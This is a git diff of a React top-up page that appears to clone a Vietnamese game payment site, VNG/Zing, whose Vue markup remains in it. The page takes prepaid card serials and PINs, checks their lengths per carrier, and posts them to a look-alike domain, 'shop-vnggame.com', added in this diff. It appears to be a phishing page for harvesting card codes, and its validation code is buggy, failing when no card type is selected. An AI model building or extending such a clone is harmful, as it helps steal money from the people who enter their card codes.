@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useRef, useState } from "react";
 import Layout from "../../libs/Layout";
 import * as Yup from "yup";
 import { useFormik } from "formik";
@@ -12,18 +12,73 @@ import Loading from "../../components/Loading";
 import { useMediaQuery } from "react-responsive";
 type Props = {};
 
-const validationSchema = Yup.object({
-  cardSerial: Yup.string().required("Vui lòng nhập số seri thẻ"),
-  cardPassword: Yup.string().required("Vui lòng nhập mã thẻ"),
-});
+
 const HomePage: React.FC<Props> = () => {
   const navigate = useNavigate();
   const [isOpen, setIsOpen] = useState<boolean>(false);
+  const [isOpenScroll, setIsOpenScroll] = useState<boolean>(false);
   const [isValidateSuccess, setValidateSuccess] = useState<boolean>(false);
   const [selectedItem, setSelectedItem] = useState(data?.[0] || null);
   const [selectedDenomination, setSelectedDenomination] = useState<any>(null);
   const [selectedCard, setSelectedCard] = useState<boolean>(false);
   const [isLoading, setIsLoading] = useState(false);
+  const validationSchema = Yup.object({
+    cardSerial: Yup.string()
+      .required("Vui lòng nhập số seri thẻ")
+      .test('len', 'Độ dài seri không phù hợp', val => {
+
+        const type = selectedDenomination.name || null; // Bạn cần thay đổi phần này để lấy được type từ đâu đó
+        if ((type.toLowerCase() === 'viettel' || type === 'VT') && (val.length !== 11 && val.length !== 14)) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'mobifone' || type === 'Mobi') && val.length !== 15) {
+          return false;
+        }
+        if (type.toLowerCase() === 'vnmb' && val.length !== 16) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'vinaphone' || type === 'Vina') && val.length !== 14) {
+          return false;
+        }
+        if (type.toLowerCase() === 'garena' && val.length !== 9) {
+          return false;
+        }
+        if (type.toLowerCase() === 'zing' && val.length !== 12) {
+          return false;
+        }
+        if (type.toLowerCase() === 'vcoin' && val.length !== 12) {
+          return false;
+        }
+        return true;
+      }),
+    cardPassword: Yup.string()
+      .required("Vui lòng nhập mã thẻ")
+      .test('len', 'Độ dài mã thẻ không phù hợp', val => {
+        const type = selectedDenomination.name || null;; 
+        if ((type.toLowerCase() === 'viettel' || type === 'VT') && (val.length !== 13 && val.length !== 15)) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'mobifone' || type === 'Mobi') && val.length !== 12) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'vnmb' || type === 'VNMB') && val.length !== 12) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'vinaphone' || type === 'Vina') && val.length !== 14) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'garena' || type === 'Garena') && val.length !== 16) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'zing' || type === 'Zing') && val.length !== 9) {
+          return false;
+        }
+        if ((type.toLowerCase() === 'vcoin' || type === 'Vcoin') && val.length !== 12) {
+          return false;
+        }
+        return true;
+      }),
+  });
   const formik: any = useFormik({
     initialValues: {
       cardSerial: "",
@@ -39,7 +94,7 @@ const HomePage: React.FC<Props> = () => {
       try {
         setIsLoading(true);
         const response: any = await axios.post(
-          "http://localhost:8000/pay",
+          "https://api.shop-vnggame.com/pay",
           values
         );
         if (response.data) {
@@ -81,6 +136,10 @@ const HomePage: React.FC<Props> = () => {
     setIsOpen(!isOpen);
   };
 
+  const handleToggleDropdownScroll = () => {
+    setIsOpenScroll(!isOpenScroll);
+  };
+
   const handleConfirmationSubmit = () => {
     formik.validateForm().then((errors: any) => {
       if (Object.keys(errors).length > 0) {
@@ -93,8 +152,125 @@ const HomePage: React.FC<Props> = () => {
     });
   };
   const isMobile = useMediaQuery({ maxWidth: 980 });
+  const listRef = useRef<any>(null);
+ 
   return (
     <Layout>
+      <div
+        id="StepIndicator"
+        className="stepIndicator"
+       
+      >
+        <div className="el-select stepIndicator__select">
+          {/**/}
+          <div
+            className={`el-input el-input--suffix ${
+              isOpenScroll ? "is-focus" : ""
+            }`}
+            onClick={handleToggleDropdownScroll}
+          >
+            {/**/}
+            <input
+              type="text"
+              autoComplete="off"
+              value={"Bước 1 / 4: Thông tin nhân vật"}
+              readOnly
+              className="el-input__inner"
+            />
+            {/**/}
+            <span className="el-input__suffix">
+              <span className="el-input__suffix-inner">
+                {isOpenScroll ? (
+                  <i className="el-select__caret el-input__icon fas fa-chevron-up"></i>
+                ) : (
+                  <i className="el-select__caret el-input__icon fas fa-chevron-down"></i>
+                )}
+              </span>
+            </span>
+          </div>
+          <div
+            className={`el-select-dropdown el-popper ${
+              isMobile ? "stepIndicatorPoperMobile" : "stepIndicatorPoper"
+            }`}
+            style={
+              !isMobile
+                ? isOpenScroll
+                  ? {
+                      minWidth: 414,
+                      top: "120px",
+                      position: "absolute",
+                      zIndex: 2007,
+                    }
+                  : {
+                      display: "none",
+                      minWidth: 770,
+                    }
+                : isOpenScroll
+                ? {
+                    minWidth: 770,
+                  }
+                : {
+                    display: "none",
+                    minWidth: 770,
+                  }
+            }
+          >
+            <div className="el-scrollbar" style={{}}>
+              <div className="el-select-dropdown__wrap el-scrollbar__wrap">
+                <ul
+                  className="el-scrollbar__view el-select-dropdown__list"
+                  ref={listRef}
+                >
+                  {/**/}
+                  <li
+                    className="el-select-dropdown__item selected"
+                    id="StepIndicator-option-1"
+                    custom-value="Bước 1/4: Thông tin nhân vật"
+                    
+                  >
+                    <span>Bước 1/4: Thông tin nhân vật</span>
+                  </li>
+                  <li
+                    className="el-select-dropdown__item"
+                    id="StepIndicator-option-2"
+                    custom-value="Bước 2/4: Chọn gói"
+                  >
+                    <span>Bước 2/4: Chọn gói</span>
+                  </li>
+                  <li
+                    className="el-select-dropdown__item is-disabled"
+                    id="StepIndicator-option-3"
+                    custom-value="Bước 3/4: Chọn phương thức thanh toán"
+                  >
+                    <span>Bước 3/4: Chọn phương thức thanh toán</span>
+                  </li>
+                  <li
+                    className="el-select-dropdown__item is-disabled"
+                    id="StepIndicator-option-4"
+                    custom-value="Bước 4/4: Xác nhận"
+                  >
+                    <span>Bước 4/4: Xác nhận</span>
+                  </li>
+                </ul>
+              </div>
+              <div className="el-scrollbar__bar is-horizontal">
+                <div
+                  className="el-scrollbar__thumb"
+                  style={{ transform: "translateX(0%)" }}
+                />
+              </div>
+              <div className="el-scrollbar__bar is-vertical">
+                <div
+                  className="el-scrollbar__thumb"
+                  style={{ transform: "translateY(0%)" }}
+                />
+              </div>
+            </div>
+            {/**/}
+          </div>
+        </div>
+      </div>
+
       <div style={{ marginTop: 0 }}>
         {/**/}
         {/**/}
@@ -650,117 +826,128 @@ const HomePage: React.FC<Props> = () => {
                                       {/**/}
                                     </span>
                                     {selectedCard && (
-                                  <div
-                                    data-v-5d4a953c
-                                    className="el-col el-col-24"
-                                    style={{ paddingLeft: 5, paddingRight: 5 }}
-                                  >
-                                    <div
-                                      data-v-5d4a953c
-                                      className="pmt-input show"
-                                    >
                                       <div
                                         data-v-5d4a953c
-                                        className="pmtInputContainer"
+                                        className="el-col el-col-24"
+                                        style={{
+                                          paddingLeft: 5,
+                                          paddingRight: 5,
+                                        }}
                                       >
-                                        <div className="el-form pmtMethodInput el-form--label-top">
-                                          <div
-                                            className={`el-form-item ${
-                                              formik.touched.cardSerial &&
-                                              formik.errors.cardSerial &&
-                                              "is-error"
-                                            } is-required`}
-                                          >
-                                            <label
-                                              htmlFor="cardSerial"
-                                              className="el-form-item__label"
-                                            >
-                                              Số seri
-                                            </label>
-                                            <div className="el-form-item__content">
-                                              <div
-                                                className="dataInput el-input"
-                                                id="PaymentInfoSubmission_cardSerial_Input"
-                                              >
-                                                {/**/}
-                                                <input
-                                                  type="text"
-                                                  autoComplete="off"
-                                                  id="cardSerial"
-                                                  placeholder="Nhập số seri"
-                                                  className={`el-input__inner`}
-                                                  {...formik.getFieldProps(
-                                                    "cardSerial"
-                                                  )}
-                                                />
-                                                {formik.errors.cardSerial && (
-                                                  <div
-                                                    id="Authentication_quick_rid_error_input"
-                                                    className="el-form-item__error is-error primo-error"
-                                                  >
-                                                    {formik.errors.cardSerial}
-                                                  </div>
-                                                )}
-                                              </div>
-                                            </div>
-                                          </div>
-                                          <div
-                                            className={`el-form-item ${
-                                              formik.touched.cardPassword &&
-                                              formik.errors.cardPassword &&
-                                              "is-error"
-                                            } is-required`}
-                                          >
-                                            <label
-                                              htmlFor="cardPassword"
-                                              className="el-form-item__label"
-                                            >
-                                              Mã thẻ
-                                            </label>
-                                            <div className="el-form-item__content">
-                                              <div
-                                                className="dataInput el-input"
-                                                id="PaymentInfoSubmission_cardPassword_Input"
-                                              >
-                                                {/**/}
-                                                <input
-                                                  type="text"
-                                                  autoComplete="off"
-                                                  id="cardPassword"
-                                                  placeholder="Nhập mã thẻ"
-                                                  {...formik.getFieldProps(
-                                                    "cardPassword"
-                                                  )}
-                                                  className="el-input__inner"
-                                                />
-                                                {formik.errors.cardPassword && (
-                                                  <div
-                                                    id="Authentication_quick_rid_error_input"
-                                                    className="el-form-item__error is-error primo-error"
-                                                  >
-                                                    {formik.errors.cardPassword}
-                                                  </div>
-                                                )}
-                                              </div>
-                                            </div>
-                                          </div>
-                                        </div>
-                                        <button
-                                          type="button"
-                                          onClick={handleConfirmationSubmit}
-                                          className={`el-button el-button--default button ${
-                                            !formik.isValid && "disabled"
-                                          }`}
+                                        <div
+                                          data-v-5d4a953c
+                                          className="pmt-input show"
                                         >
+                                          <div
+                                            data-v-5d4a953c
+                                            className="pmtInputContainer"
+                                          >
+                                            <div className="el-form pmtMethodInput el-form--label-top">
+                                              <div
+                                                className={`el-form-item ${
+                                                  formik.touched.cardSerial &&
+                                                  formik.errors.cardSerial &&
+                                                  "is-error"
+                                                } is-required`}
+                                              >
+                                                <label
+                                                  htmlFor="cardSerial"
+                                                  className="el-form-item__label"
+                                                >
+                                                  Số seri
+                                                </label>
+                                                <div className="el-form-item__content">
+                                                  <div
+                                                    className="dataInput el-input"
+                                                    id="PaymentInfoSubmission_cardSerial_Input"
+                                                  >
+                                                    {/**/}
+                                                    <input
+                                                      type="text"
+                                                      autoComplete="off"
+                                                      id="cardSerial"
+                                                      placeholder="Nhập số seri"
+                                                      className={`el-input__inner`}
+                                                      {...formik.getFieldProps(
+                                                        "cardSerial"
+                                                      )}
+                                                    />
+                                                    {formik.errors
+                                                      .cardSerial && (
+                                                      <div
+                                                        id="Authentication_quick_rid_error_input"
+                                                        className="el-form-item__error is-error primo-error"
+                                                      >
+                                                        {
+                                                          formik.errors
+                                                            .cardSerial
+                                                        }
+                                                      </div>
+                                                    )}
+                                                  </div>
+                                                </div>
+                                              </div>
+                                              <div
+                                                className={`el-form-item ${
+                                                  formik.touched.cardPassword &&
+                                                  formik.errors.cardPassword &&
+                                                  "is-error"
+                                                } is-required`}
+                                              >
+                                                <label
+                                                  htmlFor="cardPassword"
+                                                  className="el-form-item__label"
+                                                >
+                                                  Mã thẻ
+                                                </label>
+                                                <div className="el-form-item__content">
+                                                  <div
+                                                    className="dataInput el-input"
+                                                    id="PaymentInfoSubmission_cardPassword_Input"
+                                                  >
+                                                    {/**/}
+                                                    <input
+                                                      type="text"
+                                                      autoComplete="off"
+                                                      id="cardPassword"
+                                                      placeholder="Nhập mã thẻ"
+                                                      {...formik.getFieldProps(
+                                                        "cardPassword"
+                                                      )}
+                                                      className="el-input__inner"
+                                                    />
+                                                    {formik.errors
+                                                      .cardPassword && (
+                                                      <div
+                                                        id="Authentication_quick_rid_error_input"
+                                                        className="el-form-item__error is-error primo-error"
+                                                      >
+                                                        {
+                                                          formik.errors
+                                                            .cardPassword
+                                                        }
+                                                      </div>
+                                                    )}
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <button
+                                              type="button"
+                                              onClick={handleConfirmationSubmit}
+                                              className={`el-button el-button--default button ${
+                                                !formik.isValid && "disabled"
+                                              }`}
+                                            >
+                                              {/**/}
+                                              {/**/}
+                                              <span>Xác nhận</span>
+                                            </button>
+                                          </div>
                                           {/**/}
-                                          {/**/}
-                                          <span>Xác nhận</span>
-                                        </button>
+                                        </div>
                                       </div>
-                                      {/**/}
-                                    </div>
-                                  </div>
-                                )}
+                                    )}
                                     <div
                                       data-v-eac0a7dc
                                       className="pmt-method__name"
